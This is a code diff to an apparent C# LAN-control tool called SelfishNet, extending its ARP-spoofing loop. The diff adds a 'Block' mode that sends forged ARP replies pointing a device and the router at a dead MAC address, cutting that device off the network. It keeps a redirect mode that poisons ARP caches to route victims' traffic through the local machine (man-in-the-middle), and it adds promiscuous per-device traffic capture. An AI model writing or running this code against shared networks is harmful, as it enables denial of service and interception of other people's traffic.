@@ -17,6 +17,7 @@ namespace SelfishNet
 
         private PcList _pcList;
         private LibPcapLiveDevice _device;
+        private LibPcapLiveDevice _trafficDevice;
 
         private Thread _arpListenerThread;
         private Thread _spoofingThread;
@@ -260,6 +261,9 @@ namespace SelfishNet
 
         private void SpoofLoop()
         {
+            // Dead MAC used to block devices — packets sent here go nowhere
+            byte[] deadMac = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x01 };
+
             while (_isSpoofing)
             {
                 IReadOnlyList<PC> snapshot = _pcList.Devices;
@@ -270,17 +274,57 @@ namespace SelfishNet
 
                     if (target.IsLocalPc || target.IsGateway) continue;
 
-                    if (target.Redirect)
+                    if (target.Block)
                     {
+                        // BLOCK: Tell the device the gateway is at a dead MAC
+                        // Device will try to send packets there → they go nowhere
+                        SendArpReply(target.Mac.GetAddressBytes(), target.Ip.GetAddressBytes(),
+                                    deadMac, RouterIp);
+                        // Also tell the router this device is at a dead MAC
+                        SendArpReply(RouterMac, RouterIp,
+                                    deadMac, target.Ip.GetAddressBytes());
+                    }
+                    else if (target.Redirect)
+                    {
+                        // REDIRECT: Route traffic through us (MITM)
                         SendArpReply(target.Mac.GetAddressBytes(), target.Ip.GetAddressBytes(),
                                     LocalMac, RouterIp);
-
                         SendArpReply(RouterMac, RouterIp,
                                     LocalMac, target.Ip.GetAddressBytes());
                     }
                 }
                 Thread.Sleep(2000);
             }
+
+            // Restore real gateway MAC for all devices when stopping
+            RestoreArpTables();
+        }
+
+        /// <summary>
+        /// Sends correct ARP replies to restore the real gateway MAC on all devices.
+        /// Called when spoofing stops to cleanly restore the network.
+        /// </summary>
+        private void RestoreArpTables()
+        {
+            if (RouterMac == null || RouterIp == null) return;
+
+            IReadOnlyList<PC> snapshot = _pcList.Devices;
+            for (int attempt = 0; attempt < 3; attempt++)
+            {
+                foreach (PC target in snapshot)
+                {
+                    if (target.IsLocalPc || target.IsGateway) continue;
+
+                    // Tell device the real gateway MAC
+                    SendArpReply(target.Mac.GetAddressBytes(), target.Ip.GetAddressBytes(),
+                                RouterMac, RouterIp);
+                    // Tell router the real device MAC
+                    SendArpReply(RouterMac, RouterIp,
+                                target.Mac.GetAddressBytes(), target.Ip.GetAddressBytes());
+                }
+                Thread.Sleep(500);
+            }
+            Console.WriteLine("[INFO] ARP tables restored.");
         }
 
         // ──────────────────────────────────────────────
@@ -295,10 +339,24 @@ namespace SelfishNet
         {
             if (!_isMonitoringTraffic)
             {
-                _isMonitoringTraffic = true;
-                _trafficMonitorThread = new Thread(TrafficMonitorLoop) { IsBackground = true };
-                _trafficMonitorThread.Start();
-                Console.WriteLine("[INFO] Traffic monitor started.");
+                try
+                {
+                    // Open a SEPARATE device handle to avoid filter conflicts
+                    // ARP listener uses Filter="arp" on _device, so we need our own
+                    _trafficDevice = new LibPcapLiveDevice(_device.Interface);
+                    _trafficDevice.Open(DeviceModes.Promiscuous, 100);
+                    _trafficDevice.Filter = "ip"; // Only IP packets
+
+                    _isMonitoringTraffic = true;
+                    _trafficMonitorThread = new Thread(TrafficMonitorLoop) { IsBackground = true };
+                    _trafficMonitorThread.Start();
+                    Console.WriteLine("[INFO] Traffic monitor started (separate handle).");
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"[TRAFFIC] Failed to start monitor: {ex.Message}");
+                    _isMonitoringTraffic = false;
+                }
             }
         }
 
@@ -309,6 +367,10 @@ namespace SelfishNet
                 _isMonitoringTraffic = false;
                 _trafficMonitorThread?.Join(TimeSpan.FromSeconds(3));
                 _trafficMonitorThread = null;
+
+                try { _trafficDevice?.Close(); } catch { }
+                _trafficDevice = null;
+
                 Console.WriteLine("[INFO] Traffic monitor stopped.");
             }
         }
@@ -333,12 +395,12 @@ namespace SelfishNet
                         pc.BytesSent = 0;
                     }
 
-                    // Capture for 1 second
+                    // Capture for 1 second using the dedicated traffic device
                     DateTime cycleEnd = DateTime.Now.AddSeconds(1);
                     while (DateTime.Now < cycleEnd && _isMonitoringTraffic)
                     {
                         PacketCapture pCapture;
-                        var status = _device.GetNextPacket(out pCapture);
+                        var status = _trafficDevice.GetNextPacket(out pCapture);
                         if (status != GetPacketStatus.PacketRead) continue;
 
                         var raw = pCapture.GetPacket().Data;
@@ -347,6 +409,13 @@ namespace SelfishNet
                         // Check for IP packet (EtherType 0x0800)
                         if (raw[12] != 0x08 || raw[13] != 0x00) continue;
 
+                        // Extract Ethernet MACs (for secondary matching)
+                        byte[] ethDstMac = new byte[6];
+                        byte[] ethSrcMac = new byte[6];
+                        Array.Copy(raw, 0, ethDstMac, 0, 6);
+                        Array.Copy(raw, 6, ethSrcMac, 0, 6);
+
+                        // Extract IP addresses
                         byte[] srcIp = new byte[4];
                         byte[] dstIp = new byte[4];
                         Array.Copy(raw, 26, srcIp, 0, 4);
@@ -354,9 +423,13 @@ namespace SelfishNet
 
                         int packetSize = raw.Length;
 
+                        // Try IP-based matching first (primary), then MAC-based (fallback)
                         foreach (PC pc in snapshot)
                         {
                             byte[] pcIpBytes = pc.Ip.GetAddressBytes();
+                            byte[] pcMacBytes = pc.Mac?.GetAddressBytes();
+
+                            // Primary: match by IP
                             if (Tools.AreValuesEqual(pcIpBytes, srcIp))
                             {
                                 pc.BytesSent += packetSize;
@@ -365,14 +438,28 @@ namespace SelfishNet
                             {
                                 pc.BytesReceived += packetSize;
                             }
+                            // Fallback: match by Ethernet MAC when IP doesn't match
+                            // This catches traffic from devices with changed IPs
+                            else if (pcMacBytes != null)
+                            {
+                                if (Tools.AreValuesEqual(pcMacBytes, ethSrcMac))
+                                {
+                                    pc.BytesSent += packetSize;
+                                }
+                                else if (Tools.AreValuesEqual(pcMacBytes, ethDstMac))
+                                {
+                                    pc.BytesReceived += packetSize;
+                                }
+                            }
                         }
                     }
 
-                    // Update speed display property
+                    // Update speed display properties
                     foreach (PC pc in snapshot)
                     {
                         double downloadKBs = pc.BytesReceived / 1024.0;
-                        pc.DownloadSpeed = FormatSpeed(downloadKBs);
+                        double uploadKBs = pc.BytesSent / 1024.0;
+                        pc.DownloadSpeed = $"↓{FormatSpeed(downloadKBs)} ↑{FormatSpeed(uploadKBs)}";
                     }
                 }
             }
@@ -513,6 +600,9 @@ namespace SelfishNet
             _discoveringThread = null;
             _spoofingThread = null;
             _trafficMonitorThread = null;
+
+            try { if (_trafficDevice != null && _trafficDevice.Opened) _trafficDevice.Close(); } catch { }
+            _trafficDevice = null;
 
             try
             {
